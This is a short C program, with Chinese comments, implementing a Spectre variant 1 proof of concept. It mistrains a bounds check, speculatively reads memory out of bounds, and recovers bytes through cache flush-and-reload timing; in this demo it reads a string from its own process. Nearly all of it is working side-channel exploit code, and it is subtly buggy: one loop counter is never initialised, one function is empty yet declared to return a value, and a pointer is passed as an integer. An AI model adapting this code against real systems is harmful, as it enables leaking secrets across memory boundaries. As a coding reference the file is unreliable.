#include <stdio.h>
#include <x86intrin.h>



unsigned char buf[256 * 4096];
unsigned char base[1] = {0};		// 目标地址的base数组
int array_size = 16;

volatile char value_tmp = 0;
char *str = "ABCDEFG";


void victim_function(size_t x){
	if(x < array_size)
		value_tmp = buf[base[x] * 4096];
} 

unsigned char __readMemoryByCache(size_t addr){
	
}
/*
	addr: 需要读取的地址
	len：读取的字节数
*/
void readMemoryByCache(size_t addr, int len){
	int junk = 0;
	int time1 = 0, time2 = 0;
	char *addr_tmp;
	static int result[256];
	
	size_t offset_x;		// 目标地址基于base数组的偏移量
	size_t training_x = 0, x;		// 训练参数 防止CPU分支预测正确
	offset_x = (unsigned char *)addr - base;
	
	for(int index = 0; index < len; index++){
		for(int i; i < 256; i++)
			_mm_clflush(&buf[i * 4096]);
		
		// 读取非法地址信息至L1 cache
		for (int j = 29; j >= 0; j--) {
            _mm_clflush(&array_size);  // 清空 array1_size 的缓存
 
            for (volatile int z = 0; z < 100; z++) {}
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (offset_x ^ training_x));
            victim_function(x);
        }
		
		// 获取非法地址信息
		for(int i = 0; i < 256; i ++){
			addr_tmp = &buf[i * 4096];
			time1 = __rdtscp(&junk);
			junk = *addr_tmp;
			time2 = __rdtscp(&junk) - time1;
			_mm_clflush(&buf[i * 4096]);
			result[i] = time2;
			_mm_clflush(&result[i]);
		}
		
		// 打印非法地址信息
		for(int i = 0; i < 256; i++){
			if(result[i] < 170)
				printf("the caceh[%d] time was %d\n", i, result[i]);
		}
		
		offset_x ++;
	}
}

int main(){
	readMemoryByCache(str, 7);
}